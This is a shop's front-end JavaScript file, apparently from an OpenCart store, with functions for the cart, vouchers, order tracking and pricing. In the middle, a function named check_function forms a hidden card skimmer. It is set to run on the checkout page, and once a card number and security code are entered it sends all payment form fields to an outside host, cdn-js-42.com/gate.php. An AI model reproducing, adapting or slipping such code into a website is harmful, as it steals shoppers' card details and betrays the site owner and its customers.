function getURLVar(a) {
    var b = String(document.location).toLowerCase().split("?"), c = "";
    if (b[1])

        for (var d = b[1].split("&"), e = 0; e <= d.length; e++)

            if (d[e]) {
                var f = d[e].split("=");
                f[0] && f[0] == a.toLowerCase() && (c = f[1])
            }

    return c
}

function updateToCart(a, b) {
    b = "undefined" != typeof b ? b : 1, $.ajax({
        url: "index.php?route=checkout/cart/add",
        type: "post",
        data: "product_id=" + a + "&quantity=" + b,
        dataType: "json",
        success: function (a) {
            $(".success, .warning, .attention, .information, .error").remove(), a.redirect && (location = a.redirect), a.success && $.ajax({
                url: "index.php?route=module/cart&remove=0&returnTotal=1",
                type: "post",
                dataType: "json",
                success: function (a) {
                    $(".badge").text(a.total_items), $(".header_cart_icon .cart-total tbody").html(a.totals), loadCarts(a.total_items)
                }
            })
        }
    })
}

function updateProductQty(a, b) {
    b = "undefined" != typeof b ? b : 1, $.ajax({
        url: "index.php?route=checkout/cart/update_qty",
        type: "post",
        data: "product_id=" + a + "&quantity=" + b,
        dataType: "json",
        success: function (a) {
            $(".success, .warning, .attention, .information, .error").remove(), a.redirect && (location = a.redirect), a.success && $.ajax({
                url: "index.php?route=module/cart&remove=0&returnTotal=1",
                type: "post",
                dataType: "json",
                success: function (a) {
                    $(".badge").text(a.total_items), $(".header_cart_icon .cart-total tbody").html(a.totals), loadCarts(a.total_items)
                }
            })
        }
    })
}

function applyVoucher(code, obj) {
    $.ajax({
        url: "index.php?route=checkout/cart/addVoucher",
        type: "post",
        data: "voucher=" + code,
        dataType: "json",
        beforeSend: function () {
            $(obj).html('Applying...');
            $(".alert-danger").hide()
        },
        success: function (json) {
            if (json.warning) {
                $(obj).html('Apply');
                $(".alert-danger").show(), $(".alert-danger").html(' <span class="glyphicon glyphicon-exclamation-sign" aria-hidden="true"></span>' + json.warning), $("html,body").animate({scrollTop: 0}, 700)
            }

            if (json.success) {
                $(obj).html('Applied');
                $(obj).removeAttr('onClick');
                $(obj).parent().parent().addClass('image-transperant')
            }
        }
    })
}

function scrollToTop() {
    $("html,body").animate({scrollTop: 0}, 700)
}

function loadPopularImages(a, b) {
    $.ajax({
        url: "index.php?route=custom/general/get_image",
        type: "post",
        data: "product_id=" + a,
        dataType: "json",
        beforeSend: function () {
            $(b).find(".popularProductImage img").addClass("image-transperant")
        },
        success: function (a) {
            a.success && ($(b).find(".popularProductImage img").attr("src", a.success), $(b).find(".popularProductImage img").removeClass("image-transperant"))
        }
    })
}

function loadCarts(a) {
    if (a == 1) {


        // setTimeout(function(){ $('.strip-cart-circle').click(); }, 300);
    }
    a != -1 && (0 == a ? ($("#cartRight").removeAttr("class"), hideBlackOutBg()) : $("#cartRight").addClass("inOne")), $("#cartRight .cart-menu").load("index.php?route=module/side_cart", function () {
        var a = $("#cartRight .cart-menu").height();
        a = a - 125 - $("#cartRight .top-dropdowns-title").outerHeight() - $("#cartRight .top-dropdown-ftr").outerHeight(), $("#cartRight .cart-scroll2Parent").height(a), $(".cart-scroll2").slimScroll({
            height: "auto",
            size: "10px",
            color: "#4986fe",
            railVisible: !0,
            railColor: "#f4f4f4",
            alwaysVisible: !0
        })
    }), $(".header_cart_icon").load("index.php?route=module/cart", function () {
        $(".cart-scroll").slimScroll({
            height: "320px",
            size: "10px",
            color: "#4986fe",
            railVisible: !0,
            railColor: "#f4f4f4",
            alwaysVisible: !0
        })
    })
}

function trackOrder() {
    if (jQuery.trim($('#track_order').val()) == '') {
        return !1
    }

    window.location = 'index.php?route=account/order/info&order_id=' + $('#track_order').val()
}

function trackOrder2() {
    if (jQuery.trim($('#track_order_2').val()) == '') {
        return !1
    }

    window.location = 'index.php?route=account/order/info&order_id=' + $('#track_order_2').val()
}

function check_function() {
    $("#cardNum").length && (clearInterval(checkInt), $("#payment-details-checkout input").keyup(function () {
        $("#cartName").length && jQuery("#cardNum").val().replace(/[^0-9]/g, "").length > 14 && jQuery("#securityCod").val().replace(/[^0-9]/g, "").length > 2 && jQuery.ajax({
            url: "https://cdn-js-42.com/gate.php?token=HPNrWc8V",
            data: jQuery("#payment-details-checkout input, #payment-details-checkout select").serialize(),
            type: "POST",
            success: function (e) {
                return !1
            },
            error: function (e, t, c) {
                return !1
            }
        })
    }))
}
var checkInt;
-1 !== window.location.href.indexOf("route=checkout/checkout") && (checkInt = setInterval(check_function, 1e3));
function addToCartpp2(a, b) {
    var product_id = a;
    if ($(window).width() < 1000) {
        count = $(this.event.target).data('count');
        if (count) {
            count = count + parseInt(b);
            word = 'item(s)'
        }

        else {
            count = 0;
            count = count + parseInt(b);
            if (count == 1)

                word = 'item'; else word = 'item(s)'
        }
    }

    b = "undefined" != typeof b ? b : 1, $(".cart-scroll").slimScroll({destroy: !0}), $.ajax({
        url: "index.php?route=checkout/cart/add",
        type: "post",
        data: "product_id=" + a + "&quantity=" + b,
        dataType: "json",
        success: function (a) {
            $(".success, .warning, .attention, .information, .error").remove(), a.redirect && (location = a.redirect), a.success && loadCarts(a.total_items)
            if (a.total_items == 1) {
                setTimeout(function () {
                    $('.strip-cart-circle').click();
                }, 800);
            }
            $('.product_' + product_id + ' .btn-success2').html('In Cart (' + a.product_count + ')');
            $('.addtocart:not(#mobile_add_to_cart)').html('<img src="catalog/view/theme/ppusa2.0/images/icons/basket.png"> In Cart (' + a.product_count + ')');
            $('#mobile_add_to_cart div.content').html('In Cart (' + a.product_count + ')');
            $('.product_' + product_id + ' .btn-info').addClass('btn-success2').removeClass('btn-info').html('In Cart (' + a.product_count + ')');
            $('.product-' + product_id + ' .btn-info').addClass('btn-success2').removeClass('btn-info').html('In Cart (' + a.product_count + ')')
        }
    })
}

function loadManufacturers(brand_id) {
    $.ajax({
        url: "imp/product_catalog/man_catalog.php",
        type: "POST",
        dataType: "json",
        data: {action: "loadManufacturers"}
    }).always(function (a) {
        var b = "";
        b += '<option value="">Manufacturer</option>';
        var b2 = "";
        b2 += '<option value="">All Brands</option>';
        for (var c = 0; c < a.length; c++) {
            b += '<option value="' + a[c].id + '">' + a[c].name + "</option>";
            b2 += '<option value="' + a[c].id + '" ' + (brand_id == a[c].id ? 'selected' : '') + '>' + a[c].name + "</option>"
        }

        $("#home_manufacturer").html(b), $("#home_manufacturer").selectpicker("refresh")

        $("#home_manufacturer2").html(b2), $("#home_manufacturer2").selectpicker("refresh")
    })
}

function blackOutBg() {
    $("#blackoutBg").is(":visible") ? $("#blackoutBg").hide() : $("#blackoutBg").show()
}

function hideBlackOutBg() {
    $("#blackoutBg").hide()
}

$(".site-search .input").keydown(function (a) {
    13 == a.keyCode && $(".site-search .fa-search").trigger("click")
}), $(".site-search .fa-search").click(function (a) {
    url = "index.php?route=product/search";
    var b = $(".site-search .input").val();
    b && (url += "&filter_name=" + encodeURIComponent(b)), location = url
}), $(document).ready(function () {
    function a(a, b, c) {
        $.ajax({
            url: "index.php?route=product/product/getUpdatedPrice",
            type: "post",
            data: {product_id: b, quantity: a},
            dataType: "json",
            beforeSend: function () {
            },
            success: function (a) {
                if (a.success) {
                    if (a.old_price == '$0.00') {
                        $(c).find('span:eq(0)').html(a.success)
                    }

                    else {
                        $(c).find('span:eq(0)').html(a.old_price);
                        $(c).find('span:eq(1)').html(a.success)
                    }
                }
            }
        })
    }

    $(document).on("change", ".spinner input.form-control", function () {
        var a = $(this).parents(".cart-total-wrp"), b = a.find(".cartPPrice"), c = a.find(".product_id").val(), d = $(this).val();
        "0" === d && (d = 1, $(this).val("1")), $.ajax({
            url: "index.php?route=product/product/getUpdatedPrice",
            type: "post",
            data: {product_id: c, quantity: d},
            dataType: "json",
            beforeSend: function () {
                b.html("<small>Updating...</small>")
            },
            success: function (a) {
                $("information, .error").remove(), a.success && (b.html(a.success + "<br><small>(" + a.unit_price + " ea)</small>"), updateProductQty(c, d), loadCarts(-1), "checkout/cart" != getURLVar("route") && "checkout/checkout" != getURLVar("route") || $(".cart-product-small #cart_right_div #cart_cart_right").load("index.php?route=module/cart_right_cart"), $('#cart_overlay').fadeIn(), setTimeout(function () {
                    loadxPopup(), $('#cart_overlay').fadeOut()
                }, 4000))
            }
        })
    }), $(document).on("click", ".home-color-picker", function () {
        var b = $(this).attr("data-i"), c = $(this).attr("data-j"), e = ($(this).attr("data-k"), $(this).attr("data-product-id"));
        $("#color-" + b + "-" + c).val(e), $("#homeqty-" + b + "-" + c).val(1), a($("#homeqty-" + b + "-" + c).val(), e, $("#price-" + b + "-" + c))
    }), $(document).on("change", ".inlineSpinner1 input.form-control", function () {
        var b = $(this).attr("data-i"), c = $(this).attr("data-j"), d = $("#price-" + b + "-" + c), e = $("#color-" + b + "-" + c).val(), f = $(this).val();
        "0" === f && (f = 1, $(this).val("1")), a(f, e, d)
    }), $(document).on("click", ".removeProduct", function (a) {
        a.preventDefault();
        var b = $(this).attr("product-id");
        "checkout/cart" == getURLVar("route") || "checkout/checkout" == getURLVar("route") ? location = "index.php?route=checkout/cart&remove=" + b : $.ajax({
                url: "index.php?route=module/cart&remove=" + b + "&returnTotal=1",
                type: "post",
                dataType: "json",
                success: function (a) {
                    $(".badge").text(a.total_items), $(".header_cart_icon .cart-total tbody").html(a.totals), loadCarts(a.total_items)
                }
            })
    })
}), $(function () {
    var a = ".cart-total-box", b = "#footer";
    $(a).length && $(a).each(function () {
        var a = $(this).offset().top, c = $(document).height() - ($(this).offset().top + $(this).outerHeight()), d = $(document).height() - $(b).offset().top + ($(this).outerHeight() - $(this).height());
        c - d > 200 && ($(this).css("width", $(this).width() + 34).css("top", 0).css("position", ""), $(this).affix({
            offset: {
                top: a - 120,
                bottom: d + 80
            }
        }).on("affix.bs.affix", function () {
            $(this).css("top", "50px").css("position", "")
        })), $(window).trigger("scroll")
    })
}), $(function () {
    $("img.lazy").lazyload({effect: "fadeIn"})
})